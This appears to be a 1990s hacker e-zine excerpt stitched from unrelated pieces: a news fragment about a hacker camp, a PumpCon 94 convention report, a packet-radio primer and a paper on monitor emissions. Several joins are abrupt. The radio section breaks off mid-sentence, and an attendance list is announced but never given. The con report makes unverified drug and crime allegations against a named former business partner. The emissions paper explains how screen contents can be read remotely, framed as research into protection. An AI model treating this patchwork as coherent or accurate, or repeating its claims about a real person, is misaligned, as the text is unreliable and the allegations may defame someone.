they believed rules were made to be broken.

Some were there only electronically, communicating through networks around the
world.  The rest--the vast majority of them males in their late teens and
early 20s--gathered in hundreds of multicolored tents clustered around
power outlets and portable toilets in an area the size of six football fields.
Many had computer terminals in their tents, with the monitors nestled
between sleeping bags and guitars.

No one was surprised by the white van bristling with antennas that trolled
up and down the road leading to the campground.  Everyone seemed to agree
that it belonged to the Dutch Secret Service; everyone also assumed the
meeting was being monitored by the CIA and Britain&#039;s MI6.  But no one
knew for sure; paranoia is popular among hackers.

                             Pump Con 94

                       &quot;The Legacy Continues&quot;

                          by Erik Bloodaxe


Travelling sucks most of the time.  People like to glamorize it as if
it&#039;s some kind of status unobtainable to the &quot;Average Joe&quot; but
nine times out of ten its just a pain in the ass.

My trip to Philadelphia for the second PumpCon fell well within the
aforementioned nine of ten.  I was sick as a dog, coughing up
large blood-soaked clots of phlegm at a steady pace.  This was
either due to some undetected immune system failure or due to my
previous weekend&#039;s fiasco which dealt with chemical overindulgence,
alcohol abuse and some kind of strange creatures that tried to pass
as female...but that&#039;s another story.

(We will assume that my ill-health stemmed from the latter.)

I showed up at the Comfort Inn to find a lobby full of what had to be
conferees.  (They had been saying to many people they were &quot;Campus
Crusaders for Christ.&quot;)

After checking in I stumbled over to the group to see who was who.
I introduced myself and asked if Dr. Who or Mark Tabas had showed up.
They had not.  (And as it turns out, they would never show up.  Dr. Who
I can forgive since he had no way in from Boston, but Tabas...obviously
he had better things to do than drive a few miles across town to say
hello.  Remind me to reciprocate at HoHo Con.)

I was immediately pulled away by GrayAreas and Ophie, who both bestowed
upon me warnings of impending doom.  Ophie relayed that The Wing had
told her the previous night that he was going to come to the con and
&quot;get me.&quot;

GrayAreas informed me that an unscrupulous character had been
asking for me earlier.  After she described him, it was obvious that
Rogue Agent had made it to the con.  (Unscrupulous...haha)

Up in my room, I dove into my bag of medical goods and felt pity upon
myself.  Congested, contagious, feverish and now being stalked by
some unknown person.  Great.  I never much paid any heed to the threats
given by unknown typists over the net, as people&#039;s bravado multiplies
exponentially in direct proportion to the distance they are separated
behind a phone or computer screen.  During the week prior to the con
I had been threatened by at least 2 different people under a variety of
nicks and addresses.  One promised to crack me over the head with a bat.

I figured with my luck, being sick, this would be the ONE time someone
would make good on such a promise, as my timing and coordination would
obviously be impaired.  Swell.

I went on back downstairs to jump in the conversations in the lobby.  The
group had grown a bit in my absence.  I sat down and began talking to
Shortwave &amp; C-Curve about ham radio and archaic computer equipment.
Shortwave offered to send me a Commodore PET to add to the Erik Bloodaxe
Memorial Computer Archive.  (The EBMCA is a non-profit organization
devoted to maintaining the history of personal computing.  Our museum
will open soon.  Hold your breath!)

I then noticed that it appeared that damn near every IRC denizen from the
Washington DC area was at this damn con.  (sans KL &amp; Strat, but they
were to appear the following day.)  A bunch of us took off wandering around
later on to see what the hell was up at some of the other hotels.
The area was laid out in such a manner that there were like five hotels
immediately next door to one another with two cheesy restaurants between
them.

We took off to the Knights Inn and ended up hanging out in the parking
lot staring at the moon, bullshitting about really lame stuff.  While
hanging out like retards in the near freezing winds, Dark Tangent came
over and told us that Zar had been thrown off a bus for the 2nd time
and was stuck in DC and needed someone to pick him up.  No one wanted to
road trip it to DC since we were all having SOOO much fun freezing our
asses off, so Zar had to wait it out for the next bus.

In one room in the Knights Inn a bunch of people were busily smoking
their brains out.  Their little gathering was dubbed &quot;Hemp-Con.&quot;

Finally, sanity rested upon me and I decided that the cold would not
help nurse me back to health, so I took off back to my room.  Ophie was
in the room next door to mine with a bunch of people drinking.  Well,
I think Ophie was doing most of the drinking actually.  :)

I wandered in and gave her a hard time about being drunk.  She responded
by telling everyone in the room intimate details about her marriage
and her sexual involvement with the entire DC hacker scene.  Then she
took off all her clothes and ran around throwing Miniature chocolate
bars at everyone.  I&#039;m making this up, but she probably wouldn&#039;t remember.
it anyway.  Hehe.

As I went to open my door I noticed that someone had written &quot;DIE NARC&quot;
on it with a cigarette.  On the floor was the cigarette, a Camel filterless.
Well, it appeared that The Wing had arrived.  [Oh frabjuous day.  Calloo,
Callay.  I chortled in my joy.]

Just as I was about to go to bed, people were banging on my door.  When I
opened it, it looked as if everyone from Ophie&#039;s room had staggered over
for a visit.  One guy in the back, kinda tall, kinda thin, wearing a purple
shirt, was smoking a Camel stub.  I smiled a him and said, &quot;How&#039;s it going?&quot;
He seemed a bit put off but said, &quot;Do you know who I am?&quot;  I replied, &quot;Of
course I do Alan, how&#039;s it going?&quot;

This seemed to piss him off for some reason.

&quot;You might be all happy tonight, but just wait until tomorrow,&quot; he said.

&quot;Oh?&quot; I replied, &quot;you got something in store for me?  Cool.  Could you
play those Ken Shulman tapes for the con?&quot;

(For those of you who don&#039;t know, once upon a time, I had a little company
called Comsec.  One of my partners was Ken Shulman, a rather complex
new money piece of @#!*.  Well, things didn&#039;t work out with us and Ken
for a number of reasons, so we fired him.  Ken got mad at us.  He tried to
fuck over each of us in devious little ways.  To get even, I gave his
private number out to MOD via the MOD information conduit Renegade Hacker.
One day, &quot;little shulow&quot; was called up by Wing and Corrupt.  According to
several people, this call was recorded by MOD.  On this now legendary
tape, allegedly a disgruntled Shulman proceeded to tell MOD the story
of how we at Comsec were involved in crimes, drugs and were turning in
everyone to the feds.  This is the same Ken Shulman who lost his BMW to the
Houston Police when it was found with 400 hits of X in the trunk, and went
into seclusion.  But I digress.  I&#039;ve been trying to get a copy of this
tape for about two years to see if he said anything actionable about
Comsec, and to it give to the FBI if he may have been interfering with
an ongoing federal investigation.  Yes, I do hate him.)

This seemed to make Wing mad too.  I guess I might have spoiled the surprise
or something.  &quot;I&#039;m not gonna play any tapes so you can sue Shulman.&quot;

&quot;Oh, that&#039;s too bad.&quot; I said.

&quot;Well, I just want you to know, that tomorrow when it happens, you&#039;ll know,&quot;
he said.

&quot;Well, I guess we&#039;ll just wait till tomorrow then.&quot;

&quot;Yeah, we will.&quot;

&quot;Yup. I guess we will.&quot;

&quot;You think you&#039;re so cool, but YOU&#039;RE A DICK!&quot; he screamed.

Oh great, this is where I get punched.  &quot;Well, it&#039;s nice you have
your opinions.&quot;

&quot;YOU&#039;RE A FUCKING DICK!&quot;

Maybe I was supposed to be the one getting mad and doing the punching
but I wasn&#039;t getting anything but tired and was ready to take a shitload
of aspirin and slam a bottle of night-time cold syrup and antibiotics.
&quot;Well, I&#039;ll see you tomorrow.&quot;

By now, I guess everyone had figured out that there would be no
bloodsport, so someone grabbed Wing and they left.  Ophie yelled
after him, &quot;Some people are such assholes.&quot;

&quot;Well, wasn&#039;t that fun,&quot; I said to those still hanging around.  &quot;But,
alas, time for me to get some sleep.&quot;  I went down to bum some
aspirin from Noelle and told her the sordid tale, then went back to my room
and crashed out.

AND THAT&#039;S THE INFAMOUS ERIKB vs THE WING STORY.  AREN&#039;T YOU EXCITED?

That night, VaxBuster and others tried to get in the electrical box, but
were thwarted by a concerned citizen.  &quot;I&#039;M GOING DOWN TO THE FRONT DESK
RIGHT NOW!&quot;

Meanwhile, Sabre sat in the cold all night drinking himself into oblivion
while keeping a sharp, albeit bloodshot, eye out for potential feds.

The next day everyone congregated in a room at the Red Roof Inn that had
been rented as the Conference Room.  (How crafty, we&#039;ll have it in a
hotel room, and SAY its a conference room.)

Everyone piled into this room anxious for everything to begin.  We waited.
And waited.  And waited.  Several newcomers had arrived such as Strat and
his woman, Dr. Freeze (who used to be the Wizard 703 of rolodex fame.
Keep on Phreakin!), and Zar who had arranged to get kicked off of his
3rd bus right near the hotel by slamming a 40 and lighting up
cigarettes right next to the bus driver.

Finally, after about 7 hours, I figured that maybe I should just go
say something.  I hopped up and gave a quick and dirty overview of
commercial packet radio technology.  I talked briefly about RadioMail
and CDPD, and also talked about EMBARC and demonstrated sucking messages
out of a Newstream pager.  Then I sent a message from my notebook from ARDIS
to a Sprintnet gateway, thru an outdial to a dialup to a terminal server
on the Internet, and from one account mailed myself at RadioMail
which then sent it back to me on my HP95 over RAM.  I dunno...I thought
it was cool.

After speaking, I was presented with an award:  an empty porno video box.
The buttheads didn&#039;t even have the decency to give me the tape!
I put the bible in it instead and placed it back in a drawer.

GreyAreas got up next and talked a bit about her magazine and then
in a heartfelt plea, asked whoever was bothering her to stop.
Many in the audience seemed indifferent to her cause, which upset
her greatly.  She had to leave immediately afterwards.  I hope I
wasn&#039;t the only person who felt kind of sorry for her.

Now, I&#039;m not one to rain on anyone&#039;s parade, but kids, fun and games
on the net are one thing, but the minute you start fucking with people&#039;s
businesses they will go to the FBI.  Remember this.  [Personally,
I think there are about 4 or 5 specific people on the net who need to
fucking grow up before they find themselves sharing a cell with Phiber,
although that seems to be what they want.]

To be fair, people who decide that they want to get on the net need to
be reminded that THE NET IS NOT REAL!  THE NET IS NOT REAL LIFE.  IF
THE NET SCARES YOU OR WORRIES YOU, TURN OFF THE FUCKING COMPUTER!  GO
HANG OUT ON ANOTHER CHANNEL!  GO PLAY ON A MUD!  GO READ NEWS!  If that
doesn&#039;t placate you, go to AOL.

Next up was someone I didn&#039;t know, and unfortunately didn&#039;t meet.
But his girlfriend was HOT!  [If he&#039;s reading this, tell her I said &quot;hi.&quot;]

He gave everyone a rundown of the troubles from last year&#039;s Pumpcon.
I noticed during his recap that the trouble last year didn&#039;t really start
until they all read The Visionary&#039;s file.  I suggested that we hold
a midnight seance and read it aloud so we could all get busted too.

Ixom finally made it to his own con and said a few syllables about
the folks still waiting to be sentenced from last year.

Up last was VaxBuster who talked about the wonderful world of Blue
Boxing.  Yes, Virginia, there is a way to box.  People are so silly.
Obviously I&#039;m not the only one who has looked at CCITT manuals and
knows signalling frequencies in other countries, or who knows about
the &quot;International Direct&quot; numbers.  Wow.

After the conference several of us had pizza and got the worst service
I have ever had in my entire life of dining out.  Grand.  We made up for
it by amusing ourselves spotting &quot;victims&quot; with laser pointers, laughing
like idiots as we placed the dots on their foreheads.

Once we got back from chowing, everyone had already begun drinking.
People were going off to congregate at the conference room for a central
party location.  As I was leaving to go over there, The Wing walked up
to me, and said he needed to talk to me.  We went into my room and
he said he had heard what GrayAreas said earlier in the day, and he wanted
to say that it wasn&#039;t him.  I told him, he needed to tell her that, and
not me.

I went on to tell him that if he wasn&#039;t involved in all the crap going on
all over the net, then I had no problems with him.  I said he had some
really poor choices in friends in the past, but hopefully he would
exercise better judgement in the future.

We all went back over to the conference room.  Wing pulled GrayAreas outside
to talk to her.  While they were talking, I caught some talk about
payphones.

[no names from here on]

It seems this guy had a lot of phones and several people too off to go
buy a few.  They ended up at the lamest party in Pennsylvania.  Four
people and a keg.  The phones allegedly were sold for 75 bucks and
were still in the box.  Brand new.

Back at the con, one of the hapless phone buyers decided to take his phone
up to the conference room to show it off.  Once there, everyone giggled
and gawked over it, and then he took it back down to put it in a car.  On the
way there, a cop grabbed him and arrested him.  The cop then searched
the car he was about to put it in and found some pot and arrested the
car&#039;s owner too and had the car impounded.

[anonymous portion ends]

Now the cops converged on the conference room and began hounding people
in there.  One wonderful cop discovered my Porno-Bible creation and
screamed at the crowd, &quot;You heathens!  How could you do something like this?
You people are sick!&quot;

Ixom, ready for a fight, began yelling at the chief of police over the phone.
The police chief told him that maybe he would like for the nice officers
to bring him downtown to go over his complaints.  Ixom decided that
would not be necessary.

After the police interaction, people scattered from the conference room
back to their individual rooms.  No sooner than they got there, the police
decided to investigate a &quot;few noise complaints&quot; at the Comfort Inn.
Ophie&#039;s room, the Dope Room on the 1st floor and a few others got searched.

While all of this mayhem was ensuing in the outside world, I was up in my
little room being interviewed by GrayAreas for her magazine.  This was
probably the longest interview I&#039;ve ever done.  I hope I don&#039;t turn out
looking like a bigger fuckhead in it than I already am.

After the interview, I got the story of all the police interaction from
the throngs of people who gathered outside my room.  A few people
remarked, &quot;how come YOUR room didn&#039;t get searched?&quot;  I didn&#039;t have an
answer for that, except maybe because it was paid on a corporate AmEx
and might not have looked like a &quot;hacker&quot; was in there.  (No, it was
because I work for the government...just ask Agent Steal.  Geez.)

After this mess I went to bed.  Yup.

The following morning while waiting to get a table at Denny&#039;s, we noticed
that the old dudes with the beer were going into the &quot;conference room&quot;
and taking stuff out.  A bunch of the crew ran over there to check it
out and guess what?  The old guys weren&#039;t just any bunch of drunken
old dudes, they were the Pennsylvania State Police&#039;s Computer Crime
Division.  They had been staking out the conference from the room next
door and had listened in to everything.  Rad.  Two years and running.
Maybe next year the CIA and NSA will want to stake it out too.  I can&#039;t
wait.

Then I went home.

                     Informal Attendance List

&lt;Disclaimer&gt; I cranked this thing out over the weekend, and some people I
know were there, but I didn&#039;t get their names.  Some people might be listed
twice.  It&#039;s up to you to figure it out.

As we were waiting for people to arrive we came up with a lameness scale.  If
you got a &quot;+l&quot; that mean you got a lame point for saying someone&#039;s real name
or info.  Basically spouting off real stuff to people who shouldn&#039;t hear it.
Sure it&#039;s easy when you all know each other, but if I was really trying I would
have generated so much real data on people it would be scary.  On the other
hand if you were real slick and tricky, you got a &quot;+e&quot;, or elite point.  As
more and more people showed up I stopped doing this &#039;cuz we all broke up and
only the people I was around would have to suffer the wrath of the +l.  Think
of it as a security rating.  The more +l the easier it was to get info out of
people.

The List is in the order of when I ran into people.  Basically the first half
is in chronological order, but after that I lost track and got names when I
could.

The Amateur Radio Packet Network
by Larry Kollar, KC4WZK

 ... As a low-orbit satellite comes into range, Jim&#039;s system
 automatically goes into action.  The computer downloads the last
 half of an image taken by the satellite&#039;s CCD camera, the first
 half having been taken on the previous pass.  That done, the
 computer gets a list of new files on the satellite&#039;s BBS and
 downloads Jim&#039;s email...

It&#039;s legal.

 ... Her mother is on the phone, but Rhonda accesses the local
 BBS by radio.  She logs in to read postings from a world-wide
 network and her email from a penpal in Great Britain...

It&#039;s not Internet.

 ... 11:30 p.m., and the local conference node is jumping.  Two
 people were trying to work out a computer problem, when the
 local expert checked in with some ideas.  Before long, three
 more people checked in and a freewheeling discussion got under
 way...

It&#039;s happening now.

While the Internet has been growing fast and with great hoopla, amateur radio
operators (or &quot;hams&quot;) around the world have been quietly building a network of
their own -- the Amateur Radio Packet Network.  Like Internet, the packet
network has a large TCP/IP component and is available to anyone who can get
access.  Unlike Internet, getting access is very easy for nearly anyone who
already has a ham license.

The packet network is rather loosely organized, and is built and maintained by
volunteer work.  It&#039;s basic building block is the LAN (actually a MAN, or Metro
Area Network, but terminology is never 100% accurate), which are coordinated by
local or regional clubs.  A LAN occupies a specific radio frequency (or channel,
if you want to be crude about it :-), usually VHF or UHF, within a given area.
Individuals and the regional organizations provide links between LANs for
communications outside the local area.

LAN operations work much like Ethernet -- your radio waits for the frequency to
be clear, then transmits a packet.  This allows several connections to run at
once.  Most packet systems can themselves maintain up to 10 simultaneous
connections, but this feature is used only rarely.

----------------------
Packet Radio Equipment
----------------------

Hams to want to use packet radio need three pieces of equipment:

- A radio (of course).  Most LANs are found on the 2-meter band (144-148 MHz,
  with packet concentrated around 145.0 MHz and 145.6 MHz.  Many hams dedicate
  older crystal-controlled commercial or ham radios to packet work.

- A TNC (Terminal Node Controller).  This is an intelligent box that contains a
  packet modem much like the guts of a landline (telephone) modem, and a micro-
  computer that handles the network interface.  Other alternatives are
  available, including a dumb radio modem that plugs into a PC (software on the
  PC then handles the network interface), and multimode controllers that can
  handle other digital communication methods popular among hams.  However, most
  hams use TNCs since they are cheap (just over $100) and readily available.

- A terminal, or a PC running a terminal or packet program.  Since TNCs are
  smart devices, a simple terminal or terminal emulator is all that&#039;s required:
  if it has a keyboard, a display, and an RS-232 port, you can use it with a
  TNC.  However, many features (multiple connections, for example) are more
  useful if you have a computer running special packet software.

Currently, most hams use 1200 baud on 2 meters.  This is the lowest (very)
common denominator in packet radio.  However, large urban areas are starting
many new LANs in the 420-450 MHz amateur band; most of these use 9600 baud as
a minimum.  As time goes on, and packet radio becomes more popular, 9600 baud
will become the entry level.

When many inter-LAN links use 56K baud, and some go as high as 2M baud, why
are the vast majority of hams still using 1200 baud?  Part of the answer is
technical:  to get reliable performance at better than 2400 baud, you have to
tap into the guts of the radio, bypassing the audio stages for both transmit
and receive.  The other part is social:  everybody else is using 1200 baud,
why spend extra money for stuff you can&#039;t use?  The technical problem has been
solved -- you can buy &quot;data radios&quot; in kits and pre-built models that come with
the audio bypasses already in place -- but it will take a few years or a good
reason for hams to abandon their old gear and move up.

--------------------
Local Communications
--------------------

There is lots of local action to be found on the LANs.  People and clubs run
BBSes, conference nodes, and many personal mailboxes.  Most BBSes are set up so
they can send email and specified bulletins (equivalent to Usenet newsgroup
articles) to personal mailboxes during late night hours when usage is light.  A
ham using this setup simply accesses his personal mailbox to get his feed for
the day, not worrying about noise and propagation delays.

In general, a ham who wants to add a component to a LAN just puts it up and
advertises it on the local BBSes.  For example, a friend in my area recently
set up a &quot;QUOTES&quot; BBS dedicated to sharing quotes and funny stories.  Perhaps by
time this issue of Phrack is published, I will have a Xenix system available for
logins over the air.

In most areas, the local networks use AX.25 (a subset of X.25 designed by hams
especially for packet radio), although TCP/IP is getting popular in some places.
I&#039;ll talk more about this later.


-----------------------
Linking It All Together
-----------------------

A single LAN is useful, but the REAL power comes from hooking them together.
Linking LANs into a wide-area network gives the Internet its power; so it goes
with the packet network.  With inter-LAN links, we can send email nationwide
(and to many foreign countries), post articles (bulletins) for general reading,
and even make distant keyboard-to-keyboard contacts -- with some limitations.

So how is it done?  Since many metro areas support a dozen or more LANs, these
are usually linked together with high-speed UHF equipment using TCP/IP.  An
Atlanta-based group called GRAPES has developed a 56K bps system; some
experimental links in the microwave bands run as fast as 2 MEGA bps!

For long-haul links, many areas rely on HF (shortwave) frequencies.  Since the
FCC limits HF packet to 300 baud (yes, you read that right -- 300 baud), and the
HF frequencies are often very noisy, this is a slow and painful process.  The
amazing thing is not how slow it is, but that it works at all!

For this reason, many forward-looking hams are turning to packet satellites for
long-haul links.  The advantages include relatively quiet frequencies, 9600 baud
data rates, and predictability; the major disadvantage is that there are simply
not enough satellites to handle all the traffic that needs to be handled -- yet.
I&#039;ll talk more about packet satellites later.

-------------------------------
AX.25, TCP/IP, and All the Rest
-------------------------------

The packet network grew from a handful of different experiments with radio
networking, which has left us with several networking protocols.  Far and away
the most popular protocol is AX.25, which is built into thousands and thousands
of TNCs and other packet controllers.  AX.25, as implemented in most ham gear,
offers up to 10 simultaneous connections and the ability to &quot;digipeat&quot; packets.
Digipeating (DIGItal rePEATING) is one way to extend the range of a packet
station -- if you can&#039;t reach the station you want to talk with directly, you
can often digipeat through a station between you and the other person.  One
problem is that you have to manually construct a route each time you want to
contact a distant station.  The other problem is that the send-acknowledge
sequence has to run all the way across the link.  Digipeating through more than
one or two stations is a good way to annoy other LAN users, and unreliable to
boot.  The connection works as follows:

                 ---send---\    /--------&gt;
        station1            digi           station2
                 &lt;---------/    \-- ack --

One popular improvement on the digipeater is the K-node, developed by Kantronics
(a vendor of packet equipment).  The K-node establishes two links -- one between
you and the node, the other between the node and the other station.  Each link
has its own send-acknowledge loop, so a problem in one leg of the connection
doesn&#039;t require re-sending packets through the entire end-to-end connection --
only through the leg where the packet got garbled.  This connection works as
follows:

                 ---send---\      /--send--&gt;
        station1            K-node           station2
                 &lt;--ack----/      \-- ack --

The K-node shares one disadvantage with the digipeater -- you still have to
manually construct your own connection.  This is where the higher-level
protocols come in.

I&#039;ve already mentioned TCP/IP.  Yes, we have it.  The 44.*.*.* network is
assigned exclusively to amateur packet operations.  The network name is
&quot;ampr.org.&quot;  Since TNCs do not have TCP/IP in ROM, some kind of personal
computer is required.  Most of them work -- PCs, Macs, Amigas, Ataris all have
TCP/IP networking software.  If you&#039;ve ever used the free KA9Q NOS software (or
one of its derivatives), you have software that was developed by hams for hams.
TCP/IP lets amateurs create all sorts of interesting experiments, such as
setting up &quot;wormholes&quot; through the Internet to relay traffic between distant
LANs.  Some parts of the country have Internet/packet email access as well.

There are other &quot;smart&quot; networking protocols in wide use.  NET/ROM is one highly
popular protocol.  Each NET/ROM node keeps a table of nodes heard and how to
reach each one, eliminating the hassles of manual routing.  One problem with
NET/ROM is that during band openings, VHF and UHF signals can carry for hundreds
of miles beyond their normal range.  (&quot;Line of sight?&quot;  Yeah right -- a friend
of mine in north Georgia has made contacts with people as far away as Lincoln,
Nebraska on 2 meters using the stuff he carries around in his truck.)  After a
band opening, NET/ROM nodes find themselves stuffed with faraway nodes that
they can&#039;t hear anymore.

The phreakers in the audience may find ROSE interesting.  ROSE bases addresses
on the NANP area code/prefix scheme.  If a person uses ROSE, and you know her
call sign and phone number, you contact her at the address &quot;&lt;call&gt; VIA AAAPPP.&quot;
Unfortunately, ROSE does not have the widespread use necessary to make it a
nationwide network.

There are several other networking protocols in use, such as TheNet and a few
others.  However, I expect TCP/IP to replace most if not all competing protocols
in a few years.

-----------------
Packet Satellites
-----------------

Here&#039;s something you won&#039;t see on Internet.  Maybe some of Internet&#039;s traffic
goes over satellites, but direct contact?

Since 1959, amateurs have launched nearly 30 satellites into orbit.  Nearly
20 of these are still in service -- and most of them are dedicated at least
part-time to packet operation.

&gt;From a user&#039;s standpoint, there are two different types of packet satellite --
one type using 1200 bps FSK (frequency-shift keying) and the other using 9600
bps FM.  The current population is split, with about a half dozen of each type.
Most packet satellites, or pacsats, are based on a design from University of
Surrey in Great Britain -- they&#039;re small and lightweight, keeping launch costs
to a minimum.  Pacsats are always launched as secondary payloads, and often
ride as ballast to reduce launch costs even further.

Many pacsats have on-board CCD cameras that can take pictures of Earth or space,
and make the pictures available for downloading from the on-board BBS.  Other
pacsats carry equipment that allow them to be switched into a transponder mode,
such as the Japanese FujiSat that carries SSB and CW (Morse code) contacts on
Wednesdays, or can even be converted into an FM repeater such as AO-21.

Some special software has been developed to make the most of the limited
bandwidth.  For example, pictures can take more time to download than is
available during a single pass (normally 10-20 minutes), especially if other
users are sending and downloading other files at the same time.  The software,
called PB, lets you download and upload as much of a file as possible during
one pass, then gets the rest of the file on subsequent passes.  Other software
lets you automate the entire process, so you can get new files as they arrive
without having to get up early for that 4 a.m. pass.  PB also lets you download
files by listening in -- if another person is downloading the file you want, you
can simply listen to the downlink and let PB construct the file for you.  This
is a good way to save bandwidth; if two people want the same file, only one of

Getting an Amateur Radio License
--------------------------------

There are five grades of amateur radio licenses in the U.S.; from lowest to
highest, they are Novice, Technician General, Advanced, and Extra.  Each grade
of license has a test on theory and regulations, with a Morse code &quot;element&quot;
required for several of them.

The good news is that 99% of what packet radio has to offer is available to the
Technician.  The better news is that the Technician license, as of January
1991, no longer requires you to learn Morse code.  The &quot;codeless Tech&quot; has
brought a great deal of new blood into ham radio, including many hackers and
mainstream computer people.

Study guides are available from Radio Shack and the American Radio Relay League
(ARRL); the ARRL&#039;s guides are the better of the two, in my opinion.  You can get
ARRL study guides at most ham radio stores or directly from the ARRL.  If you
want to get a codeless Technician license, you&#039;ll need the Novice and the
Technician study guides.  The material isn&#039;t very hard to learn; anyone who can
navigate the guts of Ma Bell will have no trouble with the Novice or Technician
exams. :-)

The ARRL can also provide you with a free schedule of exams in your area.  The
FCC some years ago turned over all testing to accredited amateur groups, so you
should be able to find an exam at a time and place convenient to you.  Many
other ARRL services are available through an Internet mail server; send mail
to info-server@arrl.org containing the line &quot;send index&quot; in the body of your
message.

If there&#039;s any bad news, it&#039;s that a group of diehards can&#039;t stand the idea of
a code-free ham license.  Some of these folks will go out of the way to hassle
code-free hams.  Fortunately, most of them are afraid of computers and don&#039;t
do packet.  Other things to watch out for -- the FCC frowns on profanity,
intentional jamming, and encrypted data sent over the air.  A small price to
pay, in my opinion, for the opportunity to build and explore a worldwide network
without the Secret Service breathing down your neck.

Protective Measures Against Compromising Electro Magnetic Radiation
Emitted by Video Display Terminals

by Professor Erhart Moller
University of Aachen, Aachen, Germany


0. Introduction

Compromising electromagnetic radiation emitted by machinery or
instruments used in data processing or communication engineering can be
received, decoded and recorded even across large distances.  It is also
possible to recognize the data or information which was processed and
transmitted by the emitting instrument as text in clear.  Compromising
emitted electromagnetic radiation thus jeopardizes the protection and
security of data.

The Laboratory for Communication Engineering at the Fachhochschule
Aachen is developing protective measures against compromising emission
of radiation.  However, these protective measures can only be effective
if they are derived from the characteristics, the effects, and risks of
compromising emitted electromagnetic radiation.  Therefore we first
consider only the forms of appearance and the characteristics of
compromising emitted electromagnetic radiation.

1.  Compromising Emitted Electromagnetic Radiation

In this context one often refers only to the so-called computer
radiation.  But this is only one form of compromising emitted
electromagnetic radiation.  There are three types of such emissions.

1.1.  Types of Compromising Emitted Electromagnetic Radiation

Figure 1.1 shows an n example of an arbitrary electric device with various
electric connections:  a power supply line, a high frequency coaxial
transmission line, and a coolant line with in- and outflux.  This device
emits three types of compromising electromagnetic radiation:

1.  electromagnetic radiation in form of electric and magnetic fields
    and electromagnetic waves;

2.  electromagnetic waves on the outer surface of all coaxial metallic
    connections (shell waves);

3.  electric interference currents and interference voltages in power
    lines connected to the device.

Each of the three types can be transformed into the other two.  For
instance, shell waves can be emitted as fields or waves.  On the other
hand, electromagnetic waves can be caught by a nearby conductor and can
propagate on it as shell waves.  These phenomena are the reason for the
difficult control of compromising electromagnetic radiation, and they
imply that one must deal with all and not just one form of compromising
electromagnetic radiation.  Also, electromagnetic protection against
compromising emitted radiation must deal with all forms of it.

1.2. Examples of Compromising Emitted Electromagnetic Radiation

To exemplify the three types of compromising electromagnetic radiation
we consider the monitor depicted in figure 1.2.

1.2.1.  Compromising Electromagnetic Radiation

Figure 1.3. shows the experimental set-up.  The video display
terminal is connected via the power line to the power supply.  The
power line is surrounded by absorbers so that the terminal can only emit
electromagnetic radiation.  The absorbers prevent the generation of
shell waves on the power line.  The dipole antenna of the television
receiver is 10 m from the video terminal.  Figure 1.4. shows the screen
of the television receiver after it received and decoded the signal.
Not only is the large FH=AC well readable but also the smaller letters.

This demonstration yields the following results:

*  The video display terminal emits electromagnetic radiation;

*  Despite being within (standards committee) norms the emitted
   electromagnetic radiation can be received and decoded across a certain
   distance;

*  The electromagnetic radiation emitted by the terminal can be decoded
   into readable information and symbols on a television screen.
   Therefore, this emitted radiation is compromising.

1.2.2.  Compromising Surface or Shell Waves

The video display terminal and the television receiver are positioned as
in figure 1.5.  The power line of the terminal is surrounded by a
current transformer clamp which absorbs the shell waves.  The television
screen shows again the picture seen in figure 1.4.  The quality of the
picture is often better than in the previous case.  Another experiment
would demonstrate that secondary shell waves can form on a nearby
conductor.  The emitted radiation is then caught by nearby conductors
and continues to propagate as shell waves.  These emissions also give
good receptions but are almost uncontrollable along their path of
propagation.

1.2.3.   Demonstration of Compromising Emitted Radiation Through the
Power Line

Figure 1.6 shows the experimental set-up for the proof of compromising
power supply voltages.  The video display terminal acts as a generator
whose current and voltage is entered into the power supply.  Using a
capacitive line probe, the entered signal can be retrieved and fed into
the television receiver.

This form of transmission is the known basis for intercom systems or
so-called babysitter monitors where the signals are transmitted from
room to room via the energy supply lines in a home.  As in the case
of electromagnetic radiation or shell waves, one obtains the same
picture quality as in figure 1.4.

2.  Facts About Compromising Emitted Radiation

Protective measures against compromising emitted radiation are not only
determined by the above-mentions\ed three types of compromising
emissions but also by taking into account the following data:
#    level of intensity and spectral distribution;
#    frequency (emission frequency) and frequency range;
#    directional characteristics of the radiation.
These data can then be used to derive the damping and the
amplitude-frequency response for the protective measure and its
location.

2.1.  Emission Spectrum and Level of Intensity

The spectral distribution of compromising emitted radiation depends on
the frequencies used to generate the picture on a screen.  The regular
repetition of dots and lines gives rise to the video and line frequency
which is found in the spectrum.  However, the emission of video or line
frequencies is not compromising since their knowledge does not yet give
access to processed data.  If the lines are covered regularly by
symbols, a symbol frequency is obtained which is also detectable in the
spectrum.  A single symbol consists of a dot or pixel matrix.

The dot matrix of the symbol @ is also known in figure 2.1  The electron
beam scans the individual dots or pixels line-by-line and keys them
bright or dark.  This keying is done using the so-called dot or pixel
frequency.  For instance, the highest keying frequency is obtained by
scanning the center of the @ symbol since there one has a long sequence
of successive bright and dark pixels.  It also follows from figure 2.1
that the keying is slower, i.e., the keying frequency is lower, along
the upper part of the @ symbol because of a long sequence of only dark
or bright pixels.  It follows that the emissions due to the keying
frequency are highly compromising since they give direct information
about the structure of the picture.

Until recently, the frequencies in the following table were used:

        video frequency             45  Hz - 55 Hz
        line frequency              10 kHz - 20 kHz
        symbol frequency             2 MHz -  5 MHz
        dot or pixel frequency      15 MHz - 20 MHz.

The pulses for the electron beam are formed in the video part, i.e., the
video amplifier, of the monitor.  Therefore, the cathode-grid of the
picture tube and the video amplifier are the main emitters of radiation.
The upper diagram in figure 2.2 shows the calculated spectrum for the
cathode-keying.  It represents a sequence of dots from the center of the
@ symbol using a dot-sequential frequency of 18 MHz.  The diagram in the
center of figure 2.2 shows the measured spectrum at the keyed cathode of
the picture tube.  The agreement between the calculated and measured
spectrum for the frequency is clearly visible.  However, the calculated
and measured spectral representation differ in the form of the envelopes.
In the measured spectrum one finds an amplitude increase between 175 MHz
and 225 MHz.  This increase is usually found in the same or similar form
in monitors.  The reasons for this amplitude increase are design,
construction parts, and dimensions of the video display terminal.  In
the lower part of figure 2.2 we see the compromising radiation emitted by
the terminal as measured at a distance of 10 m.  The spectrum of the
radiation emitted by the terminal is superimposed by broadcast, radio
and interference spectra since the measurement took place on open
ground.  Despite this interference one can recognize the typical form of
the cathode spectrum.  The increase in the amplitude between 175 MHz
and 225 MHz presents a particular risk since the television transmitters
for Band III operate within this frequency range and all television sets are
tuned to it (see figure 2.2).

A comparison of the intensity level of the television transmitter with the
level of the compromising radiation in figure 2.2 shows their agreement.
It is therefore not very difficult to receive the compromising radiation in
proximity of the emitter using only a regular television set with normal
sensitivity.

Figure 2.3 shows the spectral distribution of compromising shell waves
emitted by the video display terminal.  Here again one recognizes the
particular form of the dot or pixel frequency.  The height of the shell wave
spectrum is much lower at higher frequencies than the height of the
radiation spectrum.  The shell waves have lower intensity in the range of
broadcast television but higher intensity in the range of cable television.
